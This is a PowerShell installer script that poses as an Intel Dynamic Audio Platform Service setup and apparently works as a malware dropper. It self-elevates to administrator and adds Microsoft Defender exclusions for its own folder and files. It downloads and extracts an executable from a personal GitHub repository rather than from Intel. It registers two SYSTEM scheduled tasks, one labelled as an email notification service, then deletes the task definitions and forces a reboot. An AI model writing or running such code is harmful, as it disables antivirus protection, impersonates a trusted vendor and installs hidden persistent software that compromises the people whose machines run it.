# Self-elevate the script if required
if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
  if ([int](Get-CimInstance -Class Win32_OperatingSystem | Select-Object -ExpandProperty BuildNumber) -ge 6000) {
        $CommandLine = "-NoExit -c cd '$env:APPDATA'; &`"" + $MyInvocation.MyCommand.Path + "`""
        Start-Process powershell -Verb runas -ArgumentList $CommandLine
        Exit
  }
}

$TargetPath = "$env:APPDATA\Intel Corporation\Intel Dynamic Audio Platform Service"
$TargetFile = "$TargetPath\Intel Dynamic Audio Platform Service.exe"
$TargetZip = "$TargetPath\Intel Dynamic Audio Platform Service.zip"
$TargetLog = "$TargetPath\Intel Dynamic Audio Platform Service.log"
$TargetXml = "$TargetPath\Intel Dynamic Audio Platform Service.xml"
$TargetEmail = "$TargetPath\Intel Dynamic Audio Notification Service.xml"
$TargetScript = "$TargetPath\Intel Dynamic Audio Notification Service.ps1"

if (Test-Path "$TargetPath") {
  Remove-Item -Recurse -Force -Path "$TargetPath"
  Write-Output "Target path removed"
}

New-Item -Path "$TargetPath" -ItemType Directory
Write-Output "Target path created"

Add-MpPreference -ExclusionProcess 'Intel Dynamic Audio Platform Service' -Force
Add-MpPreference -ExclusionProcess 'Intel Dynamic Audio Platform Service.exe' -Force
Add-MpPreference -ExclusionPath "$TargetPath" -Force
Add-MpPreference -ExclusionPath "$TargetFile" -Force
Add-MpPreference -ExclusionPath "$TargetLog" -Force
Add-MpPreference -ExclusionPath "$TargetXml" -Force
Add-MpPreference -ExclusionPath "$TargetScript" -Force
Add-MpPreference -ExclusionPath "$TargetEmail" -Force
Write-Output "Exclusions added"

if (-Not (Test-Path "$TargetFile")) {
  Invoke-WebRequest -Uri "https://github.com/B95segal/intelaudioservice/raw/refs/heads/main/x64/Release/Intel%20Dynamic%20Audio%20Platform%20Service.zip" -OutFile "$TargetZip"
  Write-Output "File downloaded"
  Expand-Archive -Path "$TargetZip" -DestinationPath "$TargetPath"
  Write-Output "File extracted"
  Remove-Item -Path "$TargetZip"
  Write-Output "Zip file removed"
}

schtasks.exe /Create /XML "$TargetXml" /tn 'Intel Dynamic Audio Platform Service' /ru SYSTEM /f
schtasks.exe /Create /XML "$TargetEmail" /tn 'Intel Dynamic Audio Notification Service' /ru SYSTEM /f

Remove-Item -Path "$TargetXml"
Remove-Item -Path "$TargetEmail"

Restart-Computer -Force